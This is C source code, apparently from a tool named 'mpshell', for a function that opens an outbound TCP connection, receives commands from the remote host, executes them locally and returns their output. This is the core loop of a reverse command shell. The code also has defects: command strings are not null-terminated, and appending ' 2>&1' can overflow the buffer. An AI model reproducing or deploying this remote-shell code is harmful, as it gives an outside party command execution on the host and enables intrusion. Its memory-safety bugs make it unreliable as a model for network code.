#include "mpshell.h"

extern mp_result_buffer *result_buffer;
extern bool RUN;

int open_tcp_channel(const char *host, int port)
{
    int sockfd;
    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(port);
    server_address.sin_addr.s_addr = inet_addr(host);

    ssize_t total_bytes_sent;
    ssize_t num_bytes_sent;
    ssize_t total_bytes_read;
    ssize_t num_bytes_read;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("[ERROR] Socket creation failed => ");
        return EXIT_FAILURE;
    }

    if (connect(sockfd, (struct sockaddr *)&server_address, sizeof(server_address)) < 0)
    {
        perror("[ERROR] Could not connect to server => ");
        return EXIT_FAILURE;
    }

    while (RUN)
    {
        uint32_t temp;
        if ((recv(sockfd, &temp, 4, 0)) < 4)
            break;

        total_bytes_read        = 0;
        num_bytes_read          = 0;
        uint32_t command_length = ntohl(temp);
        char command[command_length+5];
        while (total_bytes_read < command_length)
        {
            num_bytes_read = recv(sockfd, &command[total_bytes_read], (command_length-total_bytes_read), 0);
            if (num_bytes_read > 0)
                total_bytes_read += num_bytes_read;
        }

        if ((strcmp(command, "quit") == 0) || (strcmp(command, "exit") == 0))
            break;

        if (strstr(command, "2>") == NULL) { strcat(command, " 2>&1"); }

        execute_command(command);

        uint32_t result_length = htonl(result_buffer->num_bytes_occupied);
        if ((send(sockfd, &result_length, 4, 0)) < 4)
            break;

        total_bytes_sent = 0;
        num_bytes_sent   = 0;
        while (total_bytes_sent < result_buffer->num_bytes_occupied)
        {
            num_bytes_sent = send(sockfd, &result_buffer->data[total_bytes_sent], ((result_buffer->num_bytes_occupied)-total_bytes_sent), 0);
            if (num_bytes_sent > 0)
                total_bytes_sent += num_bytes_sent;
        }

        result_buffer->num_bytes_occupied = 0;
    }
    close(sockfd);
    return EXIT_SUCCESS;
}
